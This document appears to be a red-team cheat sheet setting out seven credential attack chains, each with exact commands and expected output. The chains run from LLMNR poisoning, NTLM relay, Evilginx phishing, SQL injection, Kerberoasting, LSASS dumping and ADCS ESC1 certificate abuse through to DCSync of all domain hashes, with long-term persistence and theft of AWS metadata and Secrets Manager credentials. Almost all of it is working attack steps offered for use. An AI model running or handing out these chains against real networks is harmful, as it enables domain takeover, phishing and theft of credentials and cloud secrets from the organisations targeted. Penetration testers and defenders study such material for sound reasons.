# Credential Attack Chains Reference

Real multi-step credential chains with exact commands at every step.
Each chain shows: technique → tool → command → expected output → next step.

---

## Chain 1: LLMNR Poison → NTLMv2 → Relay to LDAP → Shadow Credentials → TGT → DCSync

### Scenario
Network position on internal VLAN with no initial credentials.

### Step 1: LLMNR/NBT-NS Poisoning — Capture NTLMv2
```
# Disable Responder's SMB/HTTP servers (ntlmrelayx will handle relay)
# Edit /usr/share/responder/Responder.conf:
#   SMB = Off
#   HTTP = Off

responder -I eth0 -wrfv
```
**Expected output:** NTLMv2 hashes in `/usr/share/responder/logs/`
```
[SMB] NTLMv2-SSP Client   : 10.10.10.50
[SMB] NTLMv2-SSP Username : DOMAIN\jdoe
[SMB] NTLMv2-SSP Hash     : jdoe::DOMAIN:1122334455667788:A1B2C3...
```

### Step 2: Relay to LDAP — Set Shadow Credentials
```
# Instead of cracking, relay live auth to DC's LDAP
impacket-ntlmrelayx -t ldap://10.10.10.1 --shadow-credentials --shadow-target 'TARGET$'

# If shadow creds not available, use RBCD:
impacket-ntlmrelayx -t ldap://10.10.10.1 --delegate-access
```
**Expected output:**
```
[*] Setting shadow credentials on TARGET$
[*] Saved certificate and key to: output_cert.pfx
[*] PFX password: randompassword123
```

### Step 3: Use Shadow Credential Certificate → Get TGT
```
python3 gettgtpkinit.py -cert-pfx output_cert.pfx -pfx-pass randompassword123 domain.local/TARGET$ target.ccache
export KRB5CCNAME=target.ccache
```
**Expected output:** `Saved TGT to target.ccache`

### Step 4: S4U2Self → Get Admin Ticket
```
# If TARGET$ is a machine account, use its TGT to impersonate admin
impacket-getST -spn CIFS/target.domain.local -impersonate administrator -k -no-pass domain.local/TARGET$ -dc-ip 10.10.10.1
export KRB5CCNAME=administrator@CIFS_target.domain.local@DOMAIN.LOCAL.ccache
```

### Step 5: DCSync — Extract All Hashes
```
impacket-secretsdump -k -no-pass dc01.domain.local -just-dc-ntlm
```
**Expected output:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6f62b5a1ac11b2c47db91ef8c0d5b1e7:::
...
```

---

## Chain 2: Phishing → Initial Creds → Password Reuse → Admin Panel → More Creds

### Step 1: Phishing — Capture Initial Credentials
```
# GoPhish campaign or Evilginx2 reverse proxy
evilginx2
: phishlets hostname o365 login.target.com
: phishlets enable o365
: lures create o365
: lures get-url 0
# Send phishing link to targets
```
**Expected output:** Captured username + password + session token

### Step 2: Validate Credentials
```
# Test against multiple services
crackmapexec smb 10.10.10.0/24 -u jdoe -p 'CapturedPass123!' --continue-on-success
crackmapexec winrm 10.10.10.0/24 -u jdoe -p 'CapturedPass123!' --continue-on-success
crackmapexec mssql 10.10.10.0/24 -u jdoe -p 'CapturedPass123!' --continue-on-success
```
**Expected output:**
```
SMB  10.10.10.20  445  FILESERVER  [+] DOMAIN\jdoe:CapturedPass123!
SMB  10.10.10.30  445  WEBSERVER   [+] DOMAIN\jdoe:CapturedPass123!
WINRM 10.10.10.30 5985 WEBSERVER   [+] DOMAIN\jdoe:CapturedPass123! (Pwn3d!)
```

### Step 3: Access Hosts — Extract More Credentials
```
# WinRM access → dump creds
evil-winrm -i 10.10.10.30 -u jdoe -p 'CapturedPass123!'

# On target: check for saved browser creds, config files
upload lazagne.exe
lazagne.exe all -oJ
# Or: upload SharpChromium.exe
SharpChromium.exe logins
```
**Expected output:** Additional credentials from browser stores, config files

### Step 4: Password Reuse Across Services
```
# Test newly found creds against admin panels
hydra -l admin -p 'DbPassword456!' 10.10.10.40 http-post-form "/admin/login:user=^USER^&pass=^PASS^:Invalid"
# Or manual: try creds on MSSQL, SSH, RDP, web admin panels
crackmapexec smb 10.10.10.0/24 -u admin -p 'DbPassword456!' --continue-on-success
```

### Step 5: Admin Panel → Database Credential Dump
```
# If MSSQL admin access gained:
impacket-mssqlclient domain.local/sa:DbPassword456!@10.10.10.40
SQL> SELECT name, password_hash FROM sys.sql_logins;
SQL> xp_cmdshell 'whoami'
# If xp_cmdshell disabled:
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

---

## Chain 3: Web SQLi → Hash Dump → Crack → Password Reuse → SSH → Domain Creds

### Step 1: SQL Injection — Dump Password Hashes
```
sqlmap -u "http://10.10.10.50/products?id=1" --dbs
sqlmap -u "http://10.10.10.50/products?id=1" -D webapp -T users --dump
```
**Expected output:**
```
+----+----------+------------------------------------------+
| id | username | password                                 |
+----+----------+------------------------------------------+
| 1  | admin    | $2y$10$abcdef1234567890abcdef1234567890ab |
| 2  | dbadmin  | 5f4dcc3b5aa765d61d8327deb882cf99           |
+----+----------+------------------------------------------+
```

### Step 2: Identify and Crack Hashes
```
hashcat --identify hashes.txt
# admin: bcrypt ($2y$) → mode 3200
# dbadmin: MD5 → mode 0

hashcat -m 0 md5_hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 3200 bcrypt_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
**Expected output:** `5f4dcc3b5aa765d61d8327deb882cf99:password123`

### Step 3: Password Reuse — Try Cracked Password on SSH
```
crackmapexec ssh 10.10.10.0/24 -u dbadmin -p 'password123' --continue-on-success
```
**Expected output:** `SSH 10.10.10.60 22 LINUXSRV [+] dbadmin:password123`

### Step 4: SSH Access → Privilege Escalation → /etc/shadow
```
ssh dbadmin@10.10.10.60
# On target:
sudo -l
# If sudo available:
sudo cat /etc/shadow
# Extract hashes:
sudo unshadow /etc/passwd /etc/shadow > unshadowed.txt
```

### Step 5: Crack Linux Hashes → Domain Credential Reuse
```
# Transfer unshadowed.txt back
scp dbadmin@10.10.10.60:unshadowed.txt .
hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule
```
**Expected output:** `svc_backup:DomainPass2025!`

### Step 6: Domain Access with Reused Creds
```
crackmapexec smb 10.10.10.1 -u svc_backup -p 'DomainPass2025!' --shares
impacket-secretsdump domain.local/svc_backup:'DomainPass2025!'@10.10.10.1 -just-dc-ntlm
```

---

## Chain 4: Kerberoast → Crack → Service Account → Find More SPNs → Repeat

### Step 1: Kerberoast — Request Service Ticket Hashes
```
impacket-GetUserSPNs domain.local/jdoe:pass -dc-ip 10.10.10.1 -request -outputfile kerberoast.txt
```
**Expected output:**
```
ServicePrincipalName    Name       MemberOf
----------------------  ---------  --------
MSSQLSvc/sql01:1433     svc_sql    CN=Domain Admins
HTTP/web01.domain.local svc_web    CN=IT-Support
```

### Step 2: Crack TGS Hash
```
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule
hashcat -m 13100 kerberoast.txt --show
```
**Expected output:** `$krb5tgs$23$*svc_sql*...:SqlS3rvice2024!`

### Step 3: Use Service Account — Access SQL Server
```
impacket-mssqlclient domain.local/svc_sql:'SqlS3rvice2024!'@10.10.10.20
SQL> SELECT system_user;
SQL> xp_cmdshell 'whoami /all'
# svc_sql is Domain Admin → game over
# If not DA:
SQL> xp_cmdshell 'powershell -c "Get-ADUser -Filter {ServicePrincipalName -ne $null} -Properties ServicePrincipalName | Select Name,ServicePrincipalName"'
```

### Step 4: Find Additional Service Accounts
```
# From svc_sql context, enumerate more SPNs
impacket-GetUserSPNs domain.local/svc_sql:'SqlS3rvice2024!' -dc-ip 10.10.10.1 -request -outputfile kerberoast2.txt
```

### Step 5: Iterate — Crack and Pivot
```
hashcat -m 13100 kerberoast2.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule
# Continue until a privileged account cracks
```

---

## Chain 5: LSASS Dump → Cached Domain Admin → DCSync → Full Domain

### Step 1: Initial Access — Local Admin on Workstation
```
# Already have local admin via exploitation
crackmapexec smb 10.10.10.100 -u localadmin -p 'LocalPass!' --lsa
```

### Step 2: Dump LSASS — Find Cached Domain Admin
```
# Remote LSASS dump via CrackMapExec
crackmapexec smb 10.10.10.100 -u localadmin -p 'LocalPass!' -M lsassy
```
**Expected output:**
```
LSASSY  10.10.10.100  DOMAIN\jdoe       Password123!
LSASSY  10.10.10.100  DOMAIN\da-admin   aad3b435b51404ee:2b576acbe6bcfda7 (NT hash)
```

### Step 3: Validate Domain Admin Hash
```
crackmapexec smb 10.10.10.1 -u da-admin -H 2b576acbe6bcfda7 --shares
```
**Expected output:** `[+] DOMAIN\da-admin:2b576acbe6bcfda7 (Pwn3d!)`

### Step 4: DCSync with Domain Admin Hash
```
impacket-secretsdump -hashes :2b576acbe6bcfda7 domain.local/da-admin@10.10.10.1 -just-dc
```
**Expected output:** All domain hashes including krbtgt

### Step 5: Offline Cracking of Full Domain Hashes
```
# Extract NTLM hashes
grep ':::' secretsdump_output.txt | cut -d: -f4 | sort -u > domain_ntlm.txt

# Crack all NTLM hashes
hashcat -m 1000 domain_ntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# Show all cracked
hashcat -m 1000 domain_ntlm.txt --show
```

---

## Chain 6: ADCS ESC1 → Certificate as DA → Pass-the-Cert → NTLM → DCSync

### Step 1: Enumerate Vulnerable ADCS Templates
```
certipy find -u user@domain.local -p pass -dc-ip 10.10.10.1 -vulnerable -stdout
```
**Expected output:**
```
[!] Vulnerabilities
    ESC1: 'DOMAIN\\Domain Users' can enroll, enrollee supplies subject and template allows client auth
    Template: VulnerableTemplate
    CA: CORP-DC01-CA
```

### Step 2: Request Certificate as Domain Admin
```
certipy req -u user@domain.local -p pass -ca CORP-DC01-CA -target 10.10.10.1 -template VulnerableTemplate -upn administrator@domain.local
```
**Expected output:** `Certificate and key saved to administrator.pfx`

### Step 3: Authenticate with Certificate → Get NTLM Hash
```
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
**Expected output:**
```
[*] Using principal: administrator@domain.local
[*] Got TGT for 'administrator@domain.local'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got NT hash for 'administrator@domain.local': 2b576acbe6bcfda7...
```

### Step 4: DCSync with Admin NTLM Hash
```
impacket-secretsdump -hashes :2b576acbe6bcfda7 domain.local/administrator@10.10.10.1 -just-dc
```

### Step 5: Establish Persistence (Certificate Valid ~1 Year)
```
# Even if admin password is reset, certificate still works:
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
# Still returns valid TGT and current NTLM hash

# To persist longer: request new cert before expiry
```

---

## Chain 7: Cloud Metadata → IAM Role → Enumerate → Hardcoded Creds → Lateral

### Step 1: Access EC2 Metadata — Get IAM Role Credentials
```
# From compromised EC2 instance
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
```
**Expected output:**
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalrXU...",
  "Token": "FwoGZX...",
  "Expiration": "2025-02-12T06:00:00Z"
}
```

### Step 2: Configure Stolen Credentials
```
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=wJalrXU...
export AWS_SESSION_TOKEN=FwoGZX...
aws sts get-caller-identity
```
**Expected output:** `arn:aws:sts::123456789012:assumed-role/WebAppRole/i-0abc123`

### Step 3: Enumerate Accessible Services
```
# Check what we can access
aws s3 ls
aws secretsmanager list-secrets --region us-east-1
aws ssm get-parameters-by-path --path / --recursive --with-decryption --region us-east-1
aws lambda list-functions --region us-east-1
aws ec2 describe-instances --region us-east-1 --query 'Reservations[*].Instances[*].[InstanceId,Tags]'
```

### Step 4: Extract Hardcoded Credentials from Lambda / SSM
```
# Dump Lambda environment variables
aws lambda get-function --function-name ProcessOrders --region us-east-1 --query 'Configuration.Environment.Variables'

# Get secrets from SSM Parameter Store
aws ssm get-parameter --name /app/database/password --with-decryption --region us-east-1

# Get secrets from Secrets Manager
aws secretsmanager get-secret-value --secret-id prod/db/admin --region us-east-1
```
**Expected output:**
```json
{"DB_HOST": "rds-prod.cluster-abc.us-east-1.rds.amazonaws.com", "DB_USER": "admin", "DB_PASS": "ProductionDBPass2025!"}
```

### Step 5: Lateral Movement with Found Credentials
```
# Connect to RDS with found creds
mysql -h rds-prod.cluster-abc.us-east-1.rds.amazonaws.com -u admin -p'ProductionDBPass2025!'

# Dump application user table
SELECT username, password_hash FROM users;

# Try found creds against other services
aws ec2 describe-instances --query 'Reservations[*].Instances[*].PrivateIpAddress' --output text
# SSH with found creds to other instances
ssh -i stolen_key.pem ec2-user@10.0.1.50
```

### Step 6: Pivot to On-Prem (Hybrid Environments)
```
# Check for VPN / Direct Connect to on-prem
aws directconnect describe-connections
# If hybrid: try found creds against on-prem AD
crackmapexec smb 192.168.1.0/24 -u admin -p 'ProductionDBPass2025!' --continue-on-success
```
